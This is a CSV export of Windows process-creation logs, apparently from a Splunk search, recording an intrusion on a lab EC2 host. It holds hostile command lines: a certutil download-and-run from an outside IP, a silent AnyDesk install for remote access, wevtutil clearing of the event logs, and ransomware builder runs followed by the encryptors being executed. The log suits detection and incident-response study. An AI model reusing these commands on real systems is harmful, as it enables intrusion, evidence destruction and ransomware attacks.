"_time",User,Image,CommandLine
"2026-04-23 23:40:03.848 PDT","NT AUTHORITY\SYSTEM","C:\Windows\System32\taskhostw.exe","taskhostw.exe"
"2026-04-24 00:30:22.331 PDT","EC2AMAZ-I41BETP\Administrator","C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe","""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=PooledProcess2 --lang=en-US --service-sandbox-type=utility --skip-read-main-dll --metrics-shmem-handle=5696,i,10390710407954610091,15692008525054866098,524288 --field-trial-handle=2024,i,6183477394950490714,17639733192017618123,262144 --variations-seed-version --pseudonymization-salt-handle=2028,i,8271061845961178773,11245350326595146154,4 --trace-process-track-uuid=3190708997556373682 --mojo-platform-channel-handle=5428 /prefetch:8"
"2026-04-24 02:16:34.943 PDT","NT AUTHORITY\SYSTEM","C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe","""C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe"""
"2026-04-24 02:20:01.341 PDT","EC2AMAZ-I41BETP\Administrator","C:\Windows\System32\cmd.exe","cmd.exe /c ""certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %%TEMP%%\qSwUwejx.exe &amp; start /B %%TEMP%%\qSwUwejx.exe"""
"2026-04-24 02:20:01.930 PDT","EC2AMAZ-I41BETP\Administrator","C:\Users\ADMINI~1\AppData\Local\Temp\2\qSwUwejx.exe","C:\Users\ADMINI~1\AppData\Local\Temp\2\qSwUwejx.exe"
"2026-04-24 02:25:31.105 PDT","EC2AMAZ-I41BETP\Administrator","C:\Windows\System32\cmd.exe","C:\Windows\system32\cmd.exe"
"2026-04-24 02:33:22.329 PDT","EC2AMAZ-I41BETP\Administrator","C:\Users\ADMINI~1\AppData\Local\Temp\2\anydesk.exe","anydesk.exe  --install ""C:\Program Files (x86)\AnyDesk"" --start-with-win --silent"
"2026-04-24 02:33:23.460 PDT","NT AUTHORITY\SYSTEM","C:\Program Files (x86)\AnyDesk\AnyDesk.exe","""C:\Program Files (x86)\AnyDesk\AnyDesk.exe"" --service"
"2026-04-24 02:33:25.475 PDT","EC2AMAZ-I41BETP\Administrator","C:\Program Files (x86)\AnyDesk\AnyDesk.exe","""C:\Program Files (x86)\AnyDesk\AnyDesk.exe""  --control"
"2026-04-24 02:35:36.433 PDT","EC2AMAZ-I41BETP\Administrator","C:\Program Files (x86)\AnyDesk\AnyDesk.exe","""C:\Program Files (x86)\AnyDesk\AnyDesk.exe""  --set-password [REDACTED]"
"2026-04-24 02:36:36.761 PDT","EC2AMAZ-I41BETP\Administrator","C:\Program Files (x86)\AnyDesk\AnyDesk.exe","""C:\Program Files (x86)\AnyDesk\AnyDesk.exe""  --get-id"
"2026-04-24 02:43:33.881 PDT","EC2AMAZ-I41BETP\Administrator","C:\Program Files (x86)\AnyDesk\AnyDesk.exe","""C:\Program Files (x86)\AnyDesk\AnyDesk.exe""  --get-id"
"2026-04-24 02:56:51.028 PDT","EC2AMAZ-I41BETP\Administrator","C:\Windows\System32\wevtutil.exe","wevtutil  cl System"
"2026-04-24 02:56:51.055 PDT","EC2AMAZ-I41BETP\Administrator","C:\Windows\System32\wevtutil.exe","wevtutil  cl Application"
"2026-04-24 02:56:51.075 PDT","EC2AMAZ-I41BETP\Administrator","C:\Windows\System32\wevtutil.exe","wevtutil  cl Security"
"2026-04-24 03:10:49.489 PDT","NT AUTHORITY\SYSTEM","C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe","""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /ua /installsource scheduler"
"2026-04-24 03:26:04.568 PDT","NT AUTHORITY\SYSTEM","C:\Windows\System32\net.exe","net  session"
"2026-04-24 03:30:08.788 PDT","NT AUTHORITY\SYSTEM","C:\Intel\keygen.exe","keygen  -path Build -pubkey pub.key -privkey priv.key"
"2026-04-24 03:30:08.883 PDT","NT AUTHORITY\SYSTEM","C:\Intel\builder.exe","builder  -type dec -privkey Build\priv.key -config config.json -ofile Build\LB3Decryptor.exe"
"2026-04-24 03:30:08.908 PDT","NT AUTHORITY\SYSTEM","C:\Intel\builder.exe","builder  -type enc -exe -pubkey Build\pub.key -config config.json -ofile Build\LB3.exe"
"2026-04-24 03:30:08.923 PDT","NT AUTHORITY\SYSTEM","C:\Intel\builder.exe","builder  -type enc -exe -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_pass.exe"
"2026-04-24 03:30:08.942 PDT","NT AUTHORITY\SYSTEM","C:\Intel\builder.exe","builder  -type enc -dll -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32.dll"
"2026-04-24 03:30:08.957 PDT","NT AUTHORITY\SYSTEM","C:\Intel\builder.exe","builder  -type enc -dll -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32_pass.dll"
"2026-04-24 03:30:08.975 PDT","NT AUTHORITY\SYSTEM","C:\Intel\builder.exe","builder  -type enc -ref -pubkey Build\pub.key -config config.json -ofile Build\LB3_ReflectiveDll_DllMain.dll"
"2026-04-24 03:31:57.146 PDT","EC2AMAZ-I41BETP\Administrator","C:\Intel\Build\LB3_pass.exe","""C:\Intel\Build\LB3_pass.exe"""
"2026-04-24 03:32:10.162 PDT","EC2AMAZ-I41BETP\Administrator","C:\Intel\Build\LB3.exe","""C:\Intel\Build\LB3.exe"""
